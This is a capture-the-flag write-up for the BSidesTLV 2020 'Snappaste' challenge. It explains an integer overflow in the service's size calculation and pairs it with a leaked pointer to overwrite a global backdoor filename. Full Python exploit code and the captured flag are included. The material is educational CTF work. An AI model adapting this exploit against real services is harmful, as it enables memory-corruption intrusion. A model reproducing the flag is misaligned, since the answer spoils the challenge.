# Snappaste (Part 1) Writeup

First thing we did was observing the packets in packet capture software (for example Fiddler) and build a script to create valid packets.

**Python script to reproduce a paste request:**

```python
import requests
import struct
import zlib

url = 'https://snappaste.ctf.bsidestlv.com/'
paste_url = url + 'paste'
view_url = url + 'view/'
backdoor_url = url + 'backdoor/'

metadata = b'{"name": "alex","date":"2020-06-28T15:52:21.519Z"}'
data_decompressed = 'this is my data'
data_compressed = zlib.compress(data_decompressed)
metadata_size = len(metadata)
data_compressed_size = len(data_compressed)
data_decompressed_size = len(data_decompressed)

paste_data = b''
paste_data += struct.pack('<I', metadata_size)
paste_data += struct.pack('<I', data_compressed_size)
paste_data += struct.pack('<I', data_decompressed_size)
paste_data += metadata
paste_data += data_compressed

r = requests.post(paste_url, data = paste_data, verify = False, headers = { 'Cookie': 'BSidesTLV=af6e736a35c13bfbe3f81d76e271a1aa52c3e937'})
print(r.content)
```

We created a local environment by compiling the C++ code for easier testing procedure.

Tried to find vulnerability in C++ code. Even when sizes were tampered the program worked correctly because the allocation was made according to the size given.

Our final goal is to get into the next `if` statement:

```python
// TODO: remove after testing
		if (name == backdoor_filename) {
			std::cout << "printing flag" << std::endl;
			content += readfile("./flag");
		}
```

Because C++ is doing that specific compare by value (and not by reference), we need to overwrite the buffer: 

```python
// TODO: remove after testing
char backdoor_filename[17];
```

We can leak its address using the `/backdoor` API, so we only need Write-What-Where primitive, and overwrite it with our random generated file name.

We can spot an Integer Overflow vulnerability in the next line:

```python
dword num_bytes = header->metadata_size + header->data_decompressed_size + sizeof(PASTE_RECEIVED);
```

After trying many combinations, the next one worked for us:

- First we are doing a regular paste.
- We are leaking the `backdoor_filename` address using `/backdoor` API.
- Creating a new paste with the next parameters:
    - `metadata = <previous_name>`
    - `metadata_size = 16`
    - `data_decompressed = <leaked_backdoor_pointer>`
    - `data_compressed_size  = len(zlib(data_decompressed))`
    - `data_decompressed_size = 0xFFFFFFF8`
- This creates allocation of size 48.
- So line: `int result = uncompress(paste_received->data, &dest_len, data, header->data_compressed_size);` will overwrite the `paste_received->metadata` pointer with `backdoor_filename` address.
- And finally, line `memcpy(paste_received->metadata, metadata, header->metadata_size);` will overwrite the global variable with our random name.
- Flag: `BSidesTLV2020{$0metimes-jUst-4dding-tw0-nuMber$-g3ts-y0u-iN-tr0ub13s}`
Full exploit source code:

```python
import requests
import struct
import zlib

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# url = 'http://127.0.0.1:8080/'
url = 'https://snappaste.ctf.bsidestlv.com/'
paste_url = url + 'paste'
view_url = url + 'view/'
backdoor_url = url + 'backdoor/'

# NORMAL PASTE REQUEST
metadata = b'{"name": "alex","date":"2020-06-28T15:52:21.519Z"}'
data_decompressed = b'this is normal'
data_compressed = zlib.compress(data_decompressed)
metadata_size = len(metadata)
data_compressed_size = len(data_compressed)
data_decompressed_size = len(data_decompressed)

paste_data = b''
paste_data += struct.pack('<I', metadata_size)
paste_data += struct.pack('<I', data_compressed_size)
paste_data += struct.pack('<I', data_decompressed_size)
paste_data += metadata
paste_data += data_compressed

r = requests.post(paste_url, data = paste_data, verify = False, headers = { 'Cookie': 'BSidesTLV=af6e736a35c13bfbe3f81d76e271a1aa52c3e937'})
random_name = r.content
print(f'Pasted with random name: {random_name}')

# BACKDOOR REQUEST
r = requests.get(f'{backdoor_url}{r.content.decode("ascii")}', data = paste_data, verify = False, headers = { 'Cookie': 'BSidesTLV=af6e736a35c13bfbe3f81d76e271a1aa52c3e937'})
leaked_ptr = int(r.content.split(b' ')[1], 16)
print(f'Leaked ptr: {hex(leaked_ptr)}')

# VULNERABLE PASTE REQUEST
metadata = random_name
data_decompressed = struct.pack('<Q', leaked_ptr)
data_compressed = zlib.compress(data_decompressed)
metadata_size = len(metadata)
data_compressed_size = len(data_compressed)
data_decompressed_size = 0xFFFFFFF8

paste_data = b''
paste_data += struct.pack('<I', metadata_size)
paste_data += struct.pack('<I', data_compressed_size)
paste_data += struct.pack('<I', data_decompressed_size)
paste_data += metadata
paste_data += data_compressed

r = requests.post(paste_url, data = paste_data, verify = False, headers = { 'Cookie': 'BSidesTLV=af6e736a35c13bfbe3f81d76e271a1aa52c3e937'})
print(r.content)
print(f'Made vulnerable paste. Next one is viewing flag.')

r = requests.get(view_url + random_name.decode('ascii'), verify = False, headers = { 'Cookie': 'BSidesTLV=af6e736a35c13bfbe3f81d76e271a1aa52c3e937'})
print(r.content)
```
